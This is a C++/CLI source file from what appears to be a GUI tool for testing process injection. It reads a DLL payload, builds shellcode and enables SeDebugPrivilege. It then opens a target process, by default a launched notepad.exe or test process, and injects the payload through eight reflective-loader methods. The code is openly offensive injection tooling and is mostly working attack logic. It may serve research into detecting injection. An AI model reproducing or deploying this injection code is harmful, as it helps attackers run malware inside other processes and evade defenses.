#include "LoadLibraryR.h"
#include <stdio.h>
#include <stdlib.h>

//###########################


DWORD dwLength = 0;
LPVOID lpBuffer = NULL;
LPVOID lpParameter = NULL;
DWORD dwReflectiveLoaderOffset = 0;
LPVOID shellcode = NULL;

//////////////////////////////////////////////////////////////////////////////

void init() {
	FILE* fp = NULL;
	TOKEN_PRIVILEGES priv = { 0 };
	HANDLE hToken = NULL;

	const char* cpDllFile = "InjecteeDLL.dll";
	const char* exportedFuncName = "ReflectiveLoader";


	//Initialize DLL payload.
	fopen_s(&fp, cpDllFile, "rb");
	if (fp == NULL) {

	}

	fseek(fp, 0L, SEEK_END);
	dwLength = ftell(fp);
	fseek(fp, 0L, SEEK_SET);

	lpBuffer = malloc(dwLength);
	if (lpBuffer == NULL) {

	}

	fread(lpBuffer, 1, dwLength, fp);
	fclose(fp);

	//Generating Shellcode.
	shellcode = (LPVOID)_gen_payload_2();


	//Get the SE_DEBUG_PRIVILEGE.
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		}

		CloseHandle(hToken);
	}



	// check if the library has a ReflectiveLoader
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, exportedFuncName);
	if (!dwReflectiveLoaderOffset)
	{
		exit(1);
	}
}

//////////////////////////////////////////////////////////////////////////////
//Free DLL payload.
void exiting() {

	if (lpBuffer)
		free(lpBuffer);

	if (shellcode)
		free(shellcode);

}



void attack(unsigned int pid, unsigned int tid, int method, int payload_type)
{
	HANDLE hFile = NULL;
	HANDLE hProcess = NULL;


	//////////////////////////////////////////////////////////////////////////////
	// Checking inputs.

	Form1^ form = (Form1^)Application::OpenForms[0];

	if (method == 0) {
		form->set_status("Choose the Attack Option.");
		return;
	}
	else if (pid == 0) {
		STARTUPINFO suinfo = { 0 };
		suinfo.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION procinfo;

		if (method == 4 || method == 3) {
			form->set_status("Executing notepad.exe.");

			CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &suinfo, &procinfo);

			Sleep(200);

		}
		else if (method != 5 && method != 7) {

			form->set_status("Executing TestProcess.exe.");

			CreateProcess(NULL, "TestProcess.exe", NULL, NULL, FALSE, 0, NULL, NULL, &suinfo, &procinfo);

			Sleep(100);
		}

		pid = procinfo.dwProcessId;
		tid = procinfo.dwThreadId;
	}
	else {
		form->set_status("");
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
		| PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL) {

	}


	//////////////////////////////////////////////////////////////////////////////
	// using various method for alternative LoadLibrary API
	switch (method) {
	case 1:
		LoadRemoteLibraryR(payload_type, hProcess);
		break;
	case 2:
		LoadRemoteLibraryR2(payload_type, hProcess);
		break;
	case 3:
		if (tid == 0) {
			form->set_status("#3 requires Target TID.");
			break;
		}
		LoadRemoteLibraryR3(payload_type, hProcess, tid);
		break;
	case 4:
		if (tid == 0) {
			form->set_status("#4 requires Target TID.");
			break;
		}
		LoadRemoteLibraryR4(payload_type, hProcess, tid);
		break;
	case 5:
		LoadRemoteLibraryR5(payload_type);
		break;
	case 6:
		LoadRemoteLibraryR6(payload_type, hProcess);
		break;
	case 7:
		LoadRemoteLibraryR7(payload_type);
		break;
	case 8:
		LoadRemoteLibraryR8(payload_type, hProcess);
		break;
	default:
		break;
	}


	if (hProcess)
		CloseHandle(hProcess);

}